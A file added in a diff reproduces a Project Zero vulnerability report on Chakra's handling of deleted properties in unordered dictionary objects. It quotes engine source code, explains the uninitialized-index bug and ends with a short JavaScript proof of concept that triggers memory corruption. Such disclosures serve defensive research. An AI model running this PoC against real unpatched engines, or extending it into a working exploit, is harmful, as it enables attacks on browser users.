@@ -1,0 +1,95 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1281
+
+Chakra implemented the reuse of deleted properties of an unordered dictionary object with the following code.
+
+bool SimpleDictionaryUnorderedTypeHandler::TryReuseDeletedPropertyIndex(
+    DynamicObject *const object,
+    TPropertyIndex *const propertyIndex)
+{
+    if(deletedPropertyIndex == PropertyIndexRanges<TPropertyIndex>::NoSlots)
+    {
+        return false;
+    }
+
+    *propertyIndex = deletedPropertyIndex;
+    deletedPropertyIndex = static_cast<TPropertyIndex>(TaggedInt::ToInt32(object->GetSlot(deletedPropertyIndex)));
+    return true;
+}
+
+bool SimpleDictionaryUnorderedTypeHandle::TryUndeleteProperty(
+    DynamicObject *const object,
+    const TPropertyIndex existingPropertyIndex,
+    TPropertyIndex *const propertyIndex)
+{
+    ...
+
+    if(!IsReusablePropertyIndex(existingPropertyIndex))
+    {
+        return false;
+    }
+
+    ...
+
+    const bool reused = TryReuseDeletedPropertyIndex(object, propertyIndex);
+    Assert(reused);
+
+    ...
+    return true;
+}
+
+
+BOOL SimpleDictionaryTypeHandlerBase<TPropertyIndex, TMapKey, IsNotExtensibleSupported>::SetPropertyFromDescriptor(DynamicObject* instance, PropertyId propertyId, TPropertyKey propertyKey, SimpleDictionaryPropertyDescriptor<TPropertyIndex>* descriptor, Var value, PropertyOperationFlags flags, PropertyValueInfo* info)
+{
+    ...
+    if (descriptor->Attributes & PropertyDeleted)
+    {
+        ...
+        if(isUnordered)
+        {
+            TPropertyIndex propertyIndex;
+            if(AsUnordered()->TryUndeleteProperty(instance, descriptor->propertyIndex, &propertyIndex))
+            {
+                Assert(PropertyRecordStringHashComparer<TMapKey>::Equals(propertyMap->GetKeyAt(propertyIndex), propertyRecord));
+                descriptor = propertyMap->GetReferenceAt(propertyIndex);
+            }
+        }
+
+        if (IsNotExtensibleSupported)
+        {
+            bool isForce = (flags & PropertyOperation_Force) != 0;
+            if (!isForce)
+            {
+                if (!this->VerifyIsExtensible(scriptContext, throwIfNotExtensible))
+                {
+                    return FALSE; <<------ (a)
+                }
+            }
+        }
+        ...
+        descriptor->Attributes = PropertyDynamicTypeDefaults;
+        ...
+    }
+    ...
+}
+
+"TryUndeleteProperty" is calling "TryReuseDeletedPropertyIndex" on the assumption that the return value of it is always true. But if the method exits at (a), "descriptor->Attributes" will remain with "PropertyDeleted" set, and therefore we can call "TryUndeleteProperty" again and again until "deletedPropertyIndex" becames "NoSlots" which makes "TryReuseDeletedPropertyIndex" return false.
+
+In the debug build, the PoC hits the assertion "Assert(reused);". In the release build, "propertyIndex" remains uninitialized, this will cause a memory corruption.
+
+PoC:
+-->
+
+const kNumProperties = 100;
+
+let o = {};
+for (let i = 0; i < kNumProperties; ++i)
+    o['a' + i] = i;
+
+Object.preventExtensions(o);  // IsNotExtensibleSupported && !this->VerifyIsExtensible
+
+for (let i = 0; i < kNumProperties; ++i)
+    delete o['a' + i];
+
+for (let i = 0; i < 0x1000; ++i)
+    o['a0'] = 1;  // calling TryUndeleteProperty again again
